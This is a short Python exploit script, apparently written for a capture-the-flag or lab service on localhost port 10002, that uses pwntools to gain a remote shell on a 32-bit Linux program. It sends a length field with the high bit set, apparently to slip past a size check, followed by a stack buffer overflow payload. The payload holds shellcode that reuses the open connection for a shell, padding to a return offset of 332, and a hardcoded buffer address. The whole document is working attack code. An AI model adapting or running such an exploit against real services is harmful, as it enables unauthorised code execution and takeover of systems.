#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

context(arch="i386", os="linux")

BUFFER_ADDRESS = 0xffe014d0
RET_OFFSET = 332
SHELLCODE = asm(shellcraft.findpeersh())
ITEM_SIZE = 40
PAYLOAD = flat(SHELLCODE, 'A' * (RET_OFFSET - len(SHELLCODE)), BUFFER_ADDRESS)

while len(PAYLOAD) % ITEM_SIZE != 0:
    PAYLOAD += b'A'

r = remote('localhost', 10002)
r.send(flat(int(len(PAYLOAD) / ITEM_SIZE) | 0x80000000, PAYLOAD))
r.interactive()
